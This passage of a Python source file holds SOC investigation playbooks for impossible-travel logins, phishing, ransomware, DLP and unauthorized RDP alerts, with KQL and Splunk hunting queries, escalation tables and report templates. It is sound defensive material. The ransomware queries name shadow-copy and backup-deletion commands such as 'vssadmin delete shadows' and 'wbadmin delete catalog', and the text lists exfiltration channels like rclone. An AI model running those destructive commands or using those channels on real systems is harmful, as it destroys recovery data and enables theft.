   - Check HR system for travel records or remote work arrangements
   - Review the user's historical login locations for the past 90 days

3. **Device Fingerprinting**
   - Compare device details between the two sessions (OS, browser, device ID)
   - If device IDs differ, this strengthens the compromise hypothesis
   - Check for managed vs. unmanaged device enrollment status

4. **Session Analysis**
   - Review what the user accessed from the anomalous location
   - Check for email forwarding rules, inbox rules, or app consent grants
   - Look for file downloads, SharePoint access, or admin portal access
   - Check for token replay indicators (non-interactive sign-ins from same IP)

5. **Credential Exposure Check**
   - Search breach databases for the user's email
   - Check if the user was targeted by recent phishing campaigns
   - Review password reset history and MFA registration activity

## Escalation Criteria

| Condition | Severity | Action |
|-----------|----------|--------|
| User confirms VPN usage or travel | Info | Document, tune rule, close |
| Known corporate VPN IP, consistent device | Low | Document, close |
| Anomalous IP + different device + user denies travel | High | Escalate, force sign-out, reset password |
| Post-login suspicious activity (mail rules, file access) | Critical | Escalate to IR, contain account |
| MFA method changed from anomalous session | Critical | Escalate to IR, revoke all sessions, reset MFA |
| Multiple users with impossible travel from same IP | Critical | Escalate to IR, investigate phishing campaign |

## Documentation Template

```markdown
### Impossible Travel / Geo-Anomaly Investigation

**Alert ID:** [ALERT-ID]
**Date/Time:** [YYYY-MM-DD HH:MM UTC]
**Analyst:** [NAME]

**User:** [USER_UPN]
**Department:** [DEPARTMENT]
**Role:** [TITLE / PRIVILEGE LEVEL]

**Login Comparison:**

| | Login 1 (Baseline) | Login 2 (Anomalous) |
|-|--------------------|--------------------|
| Time | [TIMESTAMP] | [TIMESTAMP] |
| IP | [IP1] | [IP2] |
| Location | [CITY, COUNTRY] | [CITY, COUNTRY] |
| Device | [OS/BROWSER] | [OS/BROWSER] |
| App | [APP_NAME] | [APP_NAME] |
| MFA | [YES/NO] | [YES/NO] |
| Result | [SUCCESS/FAIL] | [SUCCESS/FAIL] |

**Time between logins:** [HOURS/MINUTES]
**Distance between locations:** [KM/MILES]
**Physically possible:** [YES/NO]

**IP Enrichment:**
- Anomalous IP reputation: [CLEAN/MALICIOUS/VPN/TOR]
- IP owner / ASN: [PROVIDER]
- Previously seen for this user: [YES/NO]

**User Contact:**
- Contacted via: [PHONE/CHAT/IN-PERSON]
- User explanation: [TRAVELING / VPN / NO EXPLANATION / UNREACHABLE]

**Post-Login Activity:**
- Email rules modified: [YES/NO]
- Files accessed: [YES/NO — details]
- Admin actions: [YES/NO — details]
- MFA changes: [YES/NO — details]

**Actions Taken:**
- [ ] Contacted user for verification
- [ ] Revoked active sessions
- [ ] Forced password reset
- [ ] Reviewed and removed suspicious inbox rules
- [ ] Reset MFA registration
- [ ] Blocked anomalous IP

**Verdict:** [True Positive / Benign Positive / False Positive]
**Escalated:** [YES/NO]
**Ticket:** [INCIDENT-ID]
```

## Response Actions Quick Reference

1. **Immediate**: If user cannot explain, revoke all sessions and force password reset
2. **Contain**: Block the anomalous IP in conditional access policies
3. **Verify**: Check for inbox rules, app consent grants, and MFA changes
4. **Recover**: Remove unauthorized inbox rules, revoke app consents, re-register MFA
5. **Harden**: Enable risk-based conditional access, require MFA for all sign-ins, deploy token protection policies
""",
        ),
        # ---------------------------------------------------------------
        # Article 5: Phishing Report End-to-End
        # ---------------------------------------------------------------
        (
            "Investigating a Phishing Report End-to-End",
            ["alert-investigation", "phishing", "email-security", "social-engineering", "credential-theft"],
            r"""# Investigating a Phishing Report End-to-End

## Alert Context

Phishing investigations begin when a user reports a suspicious email, an email gateway flags a message, or automated analysis detects phishing indicators. The investigation must determine: Is the email malicious? Did the user interact with it (clicked link, opened attachment, submitted credentials)? How many users received the same campaign? What is the blast radius?

### Key Data Sources

| Source | Log / Index | Relevant Fields |
|--------|-------------|-----------------|
| Email Gateway (Proofpoint, Mimecast, EOP) | Message trace / quarantine | sender, recipient, subject, message_id, urls, attachments |
| Microsoft 365 Threat Explorer | EmailEvents, EmailUrlInfo | SenderFromAddress, Subject, DeliveryAction, Urls |
| Proxy / Web Filter | URL access logs | user, url, category, response_code, timestamp |
| Azure AD / Entra ID | SigninLogs | UserPrincipalName, IPAddress, ResultType (post-credential harvest) |
| EDR Telemetry | Process / file events | Attachment execution, browser child processes |
| DNS Logs | Passive DNS | Domain resolution, newly registered domains |
| Reported Phish Mailbox | Phishing inbox | User-submitted suspicious emails |

### MITRE ATT&CK Mapping

| Technique | ID | Tactic |
|-----------|----|--------|
| Phishing | T1566 | Initial Access |
| Phishing: Spearphishing Attachment | T1566.001 | Initial Access |
| Phishing: Spearphishing Link | T1566.002 | Initial Access |
| User Execution: Malicious Link | T1204.001 | Execution |
| User Execution: Malicious File | T1204.002 | Execution |

## Initial Triage Checklist

- [ ] Obtain the original email (as .eml or .msg) with full headers
- [ ] Parse email headers: identify true sender, return-path, SPF/DKIM/DMARC results
- [ ] Extract all URLs from the email body and defang them for safe handling
- [ ] Extract all attachments and obtain file hashes
- [ ] Determine the phishing type: credential harvest, malware delivery, BEC, or scam
- [ ] Check if the sender domain is spoofed, look-alike, or compromised
- [ ] Identify all recipients of the same message (message trace by message-id or subject)
- [ ] Determine which recipients interacted: clicked URLs or opened attachments
- [ ] Check if any credentials were submitted to the phishing page

## Pivot Queries

### KQL (Microsoft Sentinel / Defender for Office 365)

```kql
// Find all recipients of the same phishing email by subject and sender
EmailEvents
| where TimeGenerated > ago(7d)
| where SenderFromAddress == "<PHISHING_SENDER>"
    and Subject == "<PHISHING_SUBJECT>"
| summarize RecipientCount = count(), Recipients = make_set(RecipientEmailAddress, 100)
    by SenderFromAddress, Subject, DeliveryAction

// URL click tracking for a specific phishing URL
UrlClickEvents
| where TimeGenerated > ago(7d)
| where Url contains "<PHISHING_DOMAIN>"
| project TimeGenerated, AccountUpn, Url, ActionType, IsClickedThrough

// Check for credential harvesting: sign-ins after URL click
let clickedUsers = UrlClickEvents
| where TimeGenerated > ago(7d)
| where Url contains "<PHISHING_DOMAIN>"
| where IsClickedThrough == true
| distinct AccountUpn;
SigninLogs
| where TimeGenerated > ago(7d)
| where UserPrincipalName in (clickedUsers)
| where ResultType == "0"
| where IPAddress != "<CORPORATE_IP_RANGE>"
| project TimeGenerated, UserPrincipalName, IPAddress, Location, AppDisplayName

// Email with same attachment hash
EmailAttachmentInfo
| where TimeGenerated > ago(7d)
| where SHA256 == "<ATTACHMENT_HASH>"
| join kind=inner EmailEvents on NetworkMessageId
| project TimeGenerated, SenderFromAddress, RecipientEmailAddress, Subject, FileName
```

### SPL (Splunk)

```spl
// Find all recipients by message-id or subject
index=email (message_id="<MESSAGE_ID>" OR subject="<PHISHING_SUBJECT>")
| stats count values(recipient) as recipients by sender subject
| sort -count

// Proxy logs: users who visited the phishing URL
index=proxy url="*<PHISHING_DOMAIN>*"
| stats count by user url status_code _time
| sort -_time

// Post-phish credential compromise check
index=azure_ad sourcetype="azure:aad:signin" userPrincipalName IN (<CLICKED_USERS>)
| where result_type="0"
| iplocation src_ip
| where Country!="<EXPECTED_COUNTRY>"
| table _time userPrincipalName src_ip City Country app_name

// DNS resolution of phishing domain
index=dns query="*<PHISHING_DOMAIN>*"
| stats count earliest(_time) as first_seen latest(_time) as last_seen
    values(src_ip) as querying_hosts by query answer
```

## Enrichment Steps

1. **Email Header Analysis**
   - Parse `Received` headers to trace the email path
   - Check `Return-Path`, `Reply-To` for mismatches with `From`
   - Verify SPF, DKIM, DMARC authentication results
   - Check `X-Originating-IP` for the true sender IP

2. **URL Analysis**
   - Check URLs on VirusTotal, URLhaus, PhishTank
   - Use urlscan.io to safely screenshot and analyze the phishing page
   - Check WHOIS for domain registration date (newly registered = suspicious)
   - Look for typosquatting or homoglyph domains (e.g., paypa1.com, micros0ft.com)
   - Check if the URL redirects through legitimate services (Google, Microsoft links)

3. **Attachment Analysis**
   - Submit attachment hash to VirusTotal
   - Detonate in sandbox (ANY.RUN, Hybrid Analysis, Joe Sandbox)
   - For Office documents: check for macros, DDE, external template injection
   - For PDFs: check for embedded JavaScript, launch actions, embedded URLs
   - For archives (ZIP/RAR): examine contents for executables or scripts

4. **Sender Reputation**
   - Check sender domain age and WHOIS data
   - Verify SPF record of sender domain
   - Check if sender domain appears in known phishing feeds
   - Determine if sender is a compromised legitimate account

5. **Impact Assessment**
   - Identify all recipients via message trace
   - Cross-reference with proxy logs to find who clicked
   - Check Azure AD sign-in logs for credential compromise indicators
   - Review mailbox rules for auto-forwarding (post-compromise BEC pivot)

## Escalation Criteria

| Condition | Severity | Action |
|-----------|----------|--------|
| User reported, no interaction, email quarantined | Low | Delete from all inboxes, close |
| Users clicked link but no credential entry observed | Medium | Block URL, notify clicked users, monitor |
| Credentials submitted to phishing page | High | Escalate, force password reset, revoke sessions |
| Attachment executed (malware delivery) | High | Escalate, isolate affected hosts |
| Executive / privileged user compromised | Critical | Escalate to IR, BEC containment playbook |
| Active BEC pivot: inbox rules, internal phishing | Critical | Escalate to IR, contain account, sweep organization |

## Documentation Template

```markdown
### Phishing Investigation

**Alert ID:** [ALERT-ID]
**Date/Time:** [YYYY-MM-DD HH:MM UTC]
**Analyst:** [NAME]

**Email Details:**
- From: [SENDER_ADDRESS]
- Reply-To: [REPLY_TO if different]
- Subject: [SUBJECT]
- Date sent: [TIMESTAMP]
- Message-ID: [MESSAGE_ID]
- SPF/DKIM/DMARC: [PASS/FAIL results]

**Phishing Type:** [ ] Credential Harvest [ ] Malware Delivery [ ] BEC [ ] Scam

**IOCs:**
| Type | Value | Disposition |
|------|-------|-------------|
| Sender | [EMAIL] | [Spoofed/Compromised/Malicious] |
| URL | [DEFANGED_URL] | [Phishing page / Redirect] |
| Domain | [DOMAIN] | [Registered: DATE, Hosting: PROVIDER] |
| Attachment | [FILENAME, SHA256] | [Malicious / Clean] |

**Scope:**
- Total recipients: [COUNT]
- Users who clicked: [COUNT — NAMES]
- Users who submitted credentials: [COUNT — NAMES]
- Users who opened attachment: [COUNT — NAMES]

**Actions Taken:**
- [ ] Purged email from all recipient mailboxes
- [ ] Blocked sender/domain at email gateway
- [ ] Blocked phishing URL at proxy/web filter
- [ ] Reset passwords for compromised users
- [ ] Revoked sessions for compromised users
- [ ] Checked for inbox rules on compromised accounts
- [ ] Submitted phishing URL to vendor for takedown
- [ ] Updated phishing awareness training targets

**Verdict:** [True Positive / Benign Positive / False Positive]
**Escalated:** [YES/NO]
**Ticket:** [INCIDENT-ID]
```

## Response Actions Quick Reference

1. **Immediate**: Purge the phishing email from all recipient mailboxes
2. **Block**: Add sender, domain, and URLs to blocklists at email gateway and proxy
3. **Contain**: Force password reset and session revocation for anyone who submitted credentials
4. **Investigate**: Check compromised accounts for inbox rules, sent items, and internal phishing
5. **Communicate**: Notify affected users and issue a company-wide phishing awareness alert
6. **Report**: Submit phishing URL/domain for takedown via abuse contacts or anti-phishing orgs
""",
        ),
        # ---------------------------------------------------------------
        # Article 6: Ransomware Outbreak
        # ---------------------------------------------------------------
        (
            "Investigating a Ransomware Outbreak",
            ["alert-investigation", "ransomware", "incident-response", "encryption", "extortion"],
            r"""# Investigating a Ransomware Outbreak

## Alert Context

Ransomware alerts demand the fastest possible response. Ransomware encrypts files and demands payment for decryption keys. Modern ransomware operators also exfiltrate data before encryption (double extortion). Early detection during the initial access or lateral movement phase can prevent encryption entirely. Once encryption begins, containment speed determines the blast radius.

### Key Data Sources

| Source | Log / Index | Relevant Fields |
|--------|-------------|-----------------|
| EDR / AV | Detection alerts | detection_name, process_tree, file_path, sha256 |
| Sysmon | Event IDs 1, 11, 13, 15, 23 | Process creation, file creation, registry, file delete |
| Windows Security | Event IDs 4688, 4697, 4698, 4720 | Process creation, service install, scheduled task, account creation |
| Volume Shadow Copy | vssadmin events | Shadow copy deletion |
| SMB / Network | Event ID 5140, 5145; network flow | Lateral movement, file share access |
| Backup Systems | Backup console logs | Backup deletion, configuration changes |
| DNS / Proxy | URL and domain logs | C2 communication, data exfiltration staging |

### MITRE ATT&CK Mapping

| Technique | ID | Tactic |
|-----------|----|--------|
| Data Encrypted for Impact | T1486 | Impact |
| Inhibit System Recovery | T1490 | Impact |
| Data Destruction | T1485 | Impact |
| Remote Services: SMB | T1021.002 | Lateral Movement |
| Service Execution | T1569.002 | Execution |
| Group Policy Modification | T1484.001 | Defense Evasion |

## Initial Triage Checklist

- [ ] Confirm ransomware activity (ransom note, file extensions changed, encryption in progress)
- [ ] Identify the ransomware family from the ransom note, file extension, or hash
- [ ] Determine scope: how many hosts are affected RIGHT NOW?
- [ ] Is encryption still active or has it completed?
- [ ] Identify the initial access vector (phishing, RDP, vulnerability, supply chain)
- [ ] Check for data exfiltration before encryption (double extortion)
- [ ] Assess backup integrity: are backups intact and offline?
- [ ] Identify the threat actor group if possible (for decryptor availability)
- [ ] Activate incident response plan and notify leadership

## Pivot Queries

### KQL (Microsoft Sentinel / Defender for Endpoint)

```kql
// Mass file modification or encryption activity
DeviceFileEvents
| where TimeGenerated > ago(1h)
| where ActionType in ("FileModified", "FileRenamed", "FileCreated")
| summarize FileCount = count(), UniqueExtensions = make_set(
    extract("\\.[^.]+$", 0, FileName), 20) by DeviceName, InitiatingProcessFileName, bin(TimeGenerated, 5m)
| where FileCount > 500
| sort by FileCount desc

// Ransomware indicators: shadow copy deletion
DeviceProcessEvents
| where TimeGenerated > ago(24h)
| where ProcessCommandLine has_any ("vssadmin delete shadows", "wmic shadowcopy delete",
    "bcdedit /set", "wbadmin delete catalog", "Resize ShadowStorage")
| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName

// Lateral movement via SMB to multiple hosts
DeviceNetworkEvents
| where TimeGenerated > ago(4h)
| where RemotePort == 445
| summarize TargetHosts = dcount(RemoteIP), Targets = make_set(RemoteIP, 50)
    by DeviceName, InitiatingProcessFileName
| where TargetHosts > 10
| sort by TargetHosts desc

// Service installation (PsExec, ransomware deployment)
DeviceEvents
| where TimeGenerated > ago(24h)
| where ActionType == "ServiceInstalled"
| project TimeGenerated, DeviceName, AccountName,
    AdditionalFields = parse_json(AdditionalFields)

// Ransom note file creation
DeviceFileEvents
| where TimeGenerated > ago(24h)
| where FileName matches regex @"(?i)(readme|ransom|decrypt|restore|recover|how.to|!!)"
| where FileName endswith ".txt" or FileName endswith ".html" or FileName endswith ".hta"
| project TimeGenerated, DeviceName, FileName, FolderPath, InitiatingProcessFileName
```

### SPL (Splunk)

```spl
// High-volume file modifications indicating encryption
index=sysmon EventCode=11
| bin _time span=5m
| stats count as file_count dc(TargetFilename) as unique_files by Computer, Image, _time
| where file_count > 500
| sort -file_count

// Shadow copy and recovery inhibition
index=sysmon EventCode=1
    (CommandLine="*vssadmin*delete*" OR CommandLine="*wmic*shadowcopy*delete*"
     OR CommandLine="*bcdedit*recoveryenabled*No*" OR CommandLine="*wbadmin*delete*catalog*")
| table _time Computer User Image CommandLine ParentImage

// SMB lateral movement burst
index=sysmon EventCode=3 DestinationPort=445
| bin _time span=10m
| stats dc(DestinationIp) as target_count values(DestinationIp) as targets
    by Computer, Image, _time
| where target_count > 10

// Ransomware note detection
index=sysmon EventCode=11
| regex TargetFilename="(?i)(readme|ransom|decrypt|restore|recover|how.to|!!)\.(txt|html|hta)"
| table _time Computer Image TargetFilename
```

## Enrichment Steps

1. **Ransomware Identification**
   - Check ID Ransomware (id-ransomware.malwarehunterteam.com) with ransom note or encrypted file
   - Search the file extension and ransom note text for known families
   - Check No More Ransom (nomoreransom.org) for available decryptors
   - Identify the threat actor group: LockBit, BlackCat/ALPHV, Cl0p, Royal, Play, etc.

2. **Initial Access Reconstruction**
   - Work backward from the first encrypted host to find patient zero
   - Check email logs for phishing delivery in the days before encryption
   - Review VPN and RDP logs for unauthorized external access
   - Check for recently exploited vulnerabilities (Exchange, VPN appliances, etc.)
   - Review any Cobalt Strike, SystemBC, or other post-exploitation tool indicators

3. **Lateral Movement Mapping**
   - Build a timeline of compromised hosts in order of infection
   - Identify the credentials used for lateral movement (which accounts)
   - Map the network path: which segments were reached?
   - Check for Group Policy abuse (ransomware deployment via GPO)

4. **Data Exfiltration Assessment**
   - Review proxy/firewall logs for large outbound transfers in the days before encryption
   - Check for cloud storage uploads (mega.nz, transfer.sh, rclone)
   - Look for archiving tools (7zip, WinRAR) creating large archives before exfiltration
   - Review DNS logs for tunneling or unusual query volumes

5. **Backup Integrity**
   - Verify offline/immutable backups are intact
   - Check if backup agents or repositories were targeted
   - Confirm backup recovery capability with IT operations

## Escalation Criteria

Ransomware is ALWAYS a critical escalation. There are no low-severity ransomware alerts.

| Condition | Action |
|-----------|--------|
| Ransomware confirmed on any host | Activate IR plan, notify CISO, isolate affected segment |
| Encryption actively spreading | Emergency network segmentation, isolate at switch/firewall level |
| Domain controller compromised | Assume full domain compromise, activate disaster recovery |
| Data exfiltration confirmed | Notify legal, prepare for extortion communication |
| Backups compromised | Notify executive leadership, assess recovery options |
| Ransomware note references stolen data | Engage legal, consider law enforcement notification |

## Documentation Template

```markdown
### Ransomware Outbreak Investigation

**Incident ID:** [INC-ID]
**Date/Time Detected:** [YYYY-MM-DD HH:MM UTC]
**Lead Analyst:** [NAME]
**IR Commander:** [NAME]

**Ransomware Details:**
- Family: [LOCKBIT / BLACKCAT / CLOP / etc.]
- Ransom note filename: [FILENAME]
- Encrypted file extension: [.EXTENSION]
- Ransom demand: [AMOUNT if known]
- Decryptor available: [YES/NO]
- Threat actor contact: [TOR URL / EMAIL if provided]

**Scope:**
- Hosts encrypted: [COUNT — list]
- Hosts with indicators but not yet encrypted: [COUNT — list]
- Network segments affected: [LIST]
- Domain controllers compromised: [YES/NO]
- Estimated data encrypted: [TB/GB]

**Timeline:**
| Time (UTC) | Event |
|------------|-------|
| [TIME] | Initial access (estimated) |
| [TIME] | Lateral movement first observed |
| [TIME] | Data exfiltration (if applicable) |
| [TIME] | Encryption started |
| [TIME] | First detection / user report |
| [TIME] | Containment initiated |
| [TIME] | Encryption stopped |

**Initial Access Vector:** [Phishing / RDP / Vulnerability / Supply Chain / Unknown]
**Lateral Movement Method:** [SMB+PsExec / WMI / GPO / RDP / Other]
**Credentials Compromised:** [ACCOUNT LIST]

**Data Exfiltration:**
- Evidence of exfiltration: [YES/NO]
- Estimated data exfiltrated: [SIZE]
- Method: [Cloud upload / FTP / DNS tunneling / Unknown]

**Backup Status:**
- Offline backups intact: [YES/NO]
- Last good backup date: [DATE]
- Recovery time estimate: [HOURS/DAYS]

**Actions Taken:**
- [ ] Isolated affected hosts and network segments
- [ ] Activated incident response plan
- [ ] Notified CISO and executive leadership
- [ ] Preserved forensic evidence (memory dumps, disk images)
- [ ] Identified and contained initial access vector
- [ ] Reset compromised credentials
- [ ] Engaged law enforcement (if applicable)
- [ ] Engaged external IR firm (if applicable)
- [ ] Initiated recovery from backups

**Ticket:** [INC-ID]
```

## Response Actions Quick Reference

1. **Contain NOW**: Isolate affected hosts immediately; segment the network at switch/VLAN level
2. **Preserve Evidence**: Capture memory dumps and disk images before remediation
3. **Stop Spread**: Disable compromised accounts, block C2 IPs, kill malicious processes
4. **Assess Scope**: Determine all affected hosts, accounts, and data before starting recovery
5. **Recover**: Rebuild from clean images and offline backups; do NOT pay ransom without legal guidance
6. **Communicate**: Coordinate with legal, PR, law enforcement, and cyber insurance carrier
""",
        ),
        # ---------------------------------------------------------------
        # Article 7: Data Loss Prevention (DLP) Alert
        # ---------------------------------------------------------------
        (
            "Investigating a Data Loss Prevention (DLP) Alert",
            ["alert-investigation", "dlp", "data-exfiltration", "insider-threat", "compliance"],
            r"""# Investigating a Data Loss Prevention (DLP) Alert

## Alert Context

DLP alerts fire when sensitive data (PII, PHI, PCI, intellectual property, trade secrets) is detected leaving the organization through unauthorized channels. Channels include email, cloud storage, USB devices, web uploads, and printing. DLP alerts may indicate malicious exfiltration, accidental exposure, or policy misconfiguration.

### Key Data Sources

| Source | Log / Index | Relevant Fields |
|--------|-------------|-----------------|
| DLP Platform (Symantec, Forcepoint, Microsoft Purview) | DLP incident logs | policy_name, severity, user, channel, data_type, action |
| Email Gateway | Message trace, DLP headers | sender, recipient, subject, attachment, dlp_policy_match |
| Cloud Access Security Broker (CASB) | Cloud app activity | user, app, action, file_name, file_size, sharing_scope |
| Endpoint DLP Agent | Local file events | user, file_path, destination (USB, cloud, print) |
| Proxy / Web Filter | Upload logs | user, url, upload_size, content_type |
| USB Device Logs | Sysmon Event ID 6, GPO logs | device_id, serial_number, device_class |

### MITRE ATT&CK Mapping

| Technique | ID | Tactic |
|-----------|----|--------|
| Exfiltration Over Web Service | T1567 | Exfiltration |
| Exfiltration Over Alternative Protocol | T1048 | Exfiltration |
| Data from Local System | T1005 | Collection |
| Data Staged | T1074 | Collection |
| Archive Collected Data | T1560 | Collection |

## Initial Triage Checklist

- [ ] Identify the DLP policy that triggered (what data type was detected?)
- [ ] Determine the channel: email, web upload, USB, cloud sync, print
- [ ] Identify the user and their role/department
- [ ] Review the actual content that triggered the alert (if viewable)
- [ ] Determine if the action was blocked or only logged
- [ ] Check if this is a repeat offender or first-time trigger
- [ ] Assess the sensitivity classification of the data involved
- [ ] Determine the intended recipient or destination

## Pivot Queries

### KQL (Microsoft Sentinel / Microsoft Purview)

```kql
// DLP alerts for a specific user in the last 30 days
DLPEvents
| where TimeGenerated > ago(30d)
| where User == "<USERNAME>"
| summarize AlertCount = count(), Policies = make_set(PolicyName),
    Channels = make_set(Channel) by User
| sort by AlertCount desc

// All DLP alerts for a specific policy
DLPEvents
| where TimeGenerated > ago(7d)
| where PolicyName == "<POLICY_NAME>"
| project TimeGenerated, User, Channel, FileName, Action, SensitiveInfoType, SensitiveInfoCount

// Email DLP: messages with sensitive content
EmailEvents
| where TimeGenerated > ago(7d)
| where DlpPolicyAction != ""
| project TimeGenerated, SenderFromAddress, RecipientEmailAddress, Subject,
    DlpPolicyAction, DlpPolicyName

// Cloud app DLP: file sharing with external users
CloudAppEvents
| where TimeGenerated > ago(7d)
| where ActionType in ("FileSharedExternally", "AnonymousLinkCreated", "FileUploaded")
| where AccountDisplayName == "<USERNAME>"
| project TimeGenerated, AccountDisplayName, ActionType, ObjectName, IPAddress

// Large file uploads through proxy
CommonSecurityLog
| where TimeGenerated > ago(7d)
| where DeviceAction == "allowed"
| where SentBytes > 50000000
| project TimeGenerated, SourceUserName, DestinationHostName,
    SentBytes_MB = SentBytes / 1048576.0, RequestURL
| sort by SentBytes_MB desc
```

### SPL (Splunk)

```spl
// DLP incidents by user
index=dlp user="<USERNAME>"
| stats count as incidents values(policy_name) as policies
    values(channel) as channels values(action) as actions by user
| sort -incidents

// Email DLP triggers
index=email dlp_policy_match="*"
| table _time sender recipient subject dlp_policy_match action attachment_name

// Large file uploads
index=proxy http_method=POST
| where bytes_out > 50000000
| eval mb_out=round(bytes_out/1048576, 2)
| table _time user url mb_out content_type status_code
| sort -mb_out

// USB device insertion events
index=sysmon EventCode=6
| stats count values(DeviceDescription) as devices by Computer, _time
| sort -_time

// Cloud storage uploads
index=casb action="upload" OR action="share_external"
| stats count sum(file_size) as total_bytes values(file_name) as files by user, app
| eval total_mb=round(total_bytes/1048576, 2)
| sort -total_mb
```

## Enrichment Steps

1. **Data Classification**
   - Confirm the sensitivity level of the detected data (PII, PHI, PCI, IP, confidential)
   - Determine the regulatory impact: GDPR, HIPAA, PCI-DSS, SOX, export controls
   - Quantify the data involved: number of records, types of PII fields
   - Assess the potential business impact if the data is exposed

2. **User Context**
   - Verify the user's role and whether they have legitimate access to this data
   - Check if the transfer aligns with their job function
   - Review the user's DLP alert history for patterns
   - Check if the user recently gave notice or is on a PIP (HR coordination)

3. **Destination Analysis**
   - Identify the recipient or destination service
   - Is the destination a personal email, competitor, or unknown external entity?
   - For cloud uploads, determine the sharing scope (specific people, org-wide, public)
   - Check if the destination is an approved business partner or vendor

4. **Volume and Pattern Assessment**
   - Review the user's data transfer patterns over the last 30-90 days
   - Look for unusual spikes in email attachments, cloud uploads, or USB transfers
   - Check for data staging behavior: archiving files before transfer
   - Compare current activity against the user's historical baseline

5. **Intent Determination**
   - Accidental: user was unaware of the policy, data included inadvertently
   - Negligent: user took shortcuts for convenience (personal email for work files)
   - Malicious: deliberate exfiltration to unauthorized destination

## Escalation Criteria

| Condition | Severity | Action |
|-----------|----------|--------|
| False positive: DLP misidentified non-sensitive data | Info | Tune policy, close |
| Accidental trigger, data blocked, low sensitivity | Low | Notify user, educate, close |
| Repeated accidental violations by same user | Medium | Escalate to manager, mandatory training |
| Sensitive data sent to personal email, data leaked | High | Escalate to legal/compliance, preserve evidence |
| Large volume data transfer to external storage | High | Escalate to insider threat team |
| Departing employee exfiltrating IP to competitor | Critical | Escalate to legal, HR, insider threat; preserve evidence |
| Regulated data (PHI/PCI) exposed externally | Critical | Escalate to compliance, initiate breach notification process |

## Documentation Template

```markdown
### DLP Alert Investigation

**Alert ID:** [ALERT-ID]
**Date/Time:** [YYYY-MM-DD HH:MM UTC]
**Analyst:** [NAME]

**DLP Details:**
- Policy triggered: [POLICY_NAME]
- Sensitivity type: [PII / PHI / PCI / IP / Confidential]
- Channel: [Email / Web Upload / USB / Cloud / Print]
- Action taken: [Blocked / Logged / Quarantined]
- Data volume: [RECORDS / FILES / SIZE]

**User:**
- Name: [USERNAME]
- Department: [DEPARTMENT]
- Role: [TITLE]
- Employment status: [Active / Notice Period / PIP]
- Prior DLP violations: [COUNT]

**Destination:**
- Recipient / URL: [DESTINATION]
- Classification: [Personal / Competitor / Partner / Unknown]
- Approved destination: [YES/NO]

**Content Summary:**
[Description of the data involved without reproducing sensitive content]

**Intent Assessment:** [ ] Accidental [ ] Negligent [ ] Malicious [ ] Undetermined

**Regulatory Impact:**
- [ ] GDPR
- [ ] HIPAA / PHI
- [ ] PCI-DSS
- [ ] SOX
- [ ] Export controls
- [ ] None identified

**Actions Taken:**
- [ ] Reviewed full content of DLP alert
- [ ] Confirmed data sensitivity classification
- [ ] Contacted user for explanation
- [ ] Notified user's manager
- [ ] Escalated to legal/compliance
- [ ] Recalled or blocked the data transfer
- [ ] Preserved evidence for investigation
- [ ] Initiated breach notification (if required)

**Verdict:** [True Positive / Benign Positive / False Positive]
**Escalated:** [YES/NO]
**Ticket:** [INCIDENT-ID]
```

## Response Actions Quick Reference

1. **Immediate**: If data was not blocked, attempt to recall or revoke access to shared content
2. **Preserve**: Collect screenshots, logs, and the DLP alert for evidence
3. **Contain**: Restrict user's access to sensitive data pending investigation
4. **Assess**: Determine regulatory obligations (breach notification timelines)
5. **Remediate**: Work with the user's manager on corrective action (training or disciplinary)
6. **Harden**: Refine DLP policies to reduce false positives and close detection gaps
""",
        ),
        # ---------------------------------------------------------------
        # Article 8: Unauthorized RDP or Remote Access
        # ---------------------------------------------------------------
        (
            "Investigating Unauthorized RDP or Remote Access",
            ["alert-investigation", "rdp", "remote-access", "lateral-movement", "initial-access"],
            r"""# Investigating Unauthorized RDP or Remote Access

## Alert Context

Unauthorized RDP and remote access alerts fire when Remote Desktop Protocol, VNC, TeamViewer, AnyDesk, or other remote access tools are used in unexpected ways. Attackers abuse RDP for initial access (internet-exposed RDP), lateral movement (internal pivoting), and maintaining persistence (commercial remote access tools). These alerts are high-priority because remote access provides full interactive control of compromised systems.

### Key Data Sources

| Source | Log / Index | Relevant Fields |
|--------|-------------|-----------------|
| Windows Security | Event IDs 4624 (Type 10), 4625, 4778, 4779 | TargetUserName, IpAddress, LogonType, WorkstationName |
| Windows TerminalServices | Event IDs 21, 22, 23, 24, 25 | User, SessionID, Source Network Address |
| Sysmon | Event IDs 1, 3 | Process creation, network connections for remote tools |
| Firewall / VPN | Connection logs | src_ip, dst_ip, dst_port (3389, 5900, etc.) |
| NLA / CredSSP | Event ID 261 | Client IP prior to authentication |
| EDR | Process and network telemetry | remote_tool_name, parent_process, network_connections |
| Network Flow | NetFlow / IPFIX | Internal RDP flows, unusual port usage |

### MITRE ATT&CK Mapping

| Technique | ID | Tactic |
|-----------|----|--------|
| Remote Desktop Protocol | T1021.001 | Lateral Movement |
| Remote Services | T1021 | Lateral Movement |
| External Remote Services | T1133 | Initial Access, Persistence |
| Remote Access Software | T1219 | Command and Control |
| Valid Accounts | T1078 | Defense Evasion, Initial Access |

## Initial Triage Checklist

- [ ] Identify the type of remote access: RDP, VNC, TeamViewer, AnyDesk, SSH, or other
- [ ] Determine the source IP: external (internet) or internal (lateral movement)
- [ ] Identify the destination host and its criticality (workstation, server, DC)
- [ ] Check if the remote access is expected for this user/host combination
- [ ] Verify the user account used: is it legitimate, service, or newly created?
- [ ] Check if MFA or NLA is enforced for this access method
- [ ] Review what the user did during the remote session
- [ ] Look for unauthorized remote access tool installations

## Pivot Queries

### KQL (Microsoft Sentinel)

```kql
// RDP logons (Type 10) from unexpected sources
SecurityEvent
| where TimeGenerated > ago(24h)
| where EventID == 4624 and LogonType == 10
| where IpAddress !startswith "10." and IpAddress !startswith "192.168."
    and IpAddress !startswith "172."
| project TimeGenerated, Computer, TargetUserName, IpAddress, WorkstationName

// Failed RDP attempts (brute force precursor)
SecurityEvent
| where TimeGenerated > ago(24h)
| where EventID == 4625 and LogonType == 10
| summarize FailCount = count(), Accounts = make_set(TargetUserName, 20)
    by IpAddress, Computer
| where FailCount > 5
| sort by FailCount desc

// Internal RDP lateral movement: one host connecting to many via RDP
DeviceNetworkEvents
| where TimeGenerated > ago(24h)
| where RemotePort == 3389
| summarize TargetCount = dcount(RemoteIP), Targets = make_set(RemoteIP, 20)
    by DeviceName, InitiatingProcessAccountName
| where TargetCount > 3
| sort by TargetCount desc

// Remote access tool installation (TeamViewer, AnyDesk, etc.)
DeviceProcessEvents
| where TimeGenerated > ago(7d)
| where FileName has_any ("TeamViewer", "AnyDesk", "ScreenConnect",
    "LogMeIn", "RemotePC", "Splashtop", "Ammyy")
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine,
    InitiatingProcessFileName, AccountName

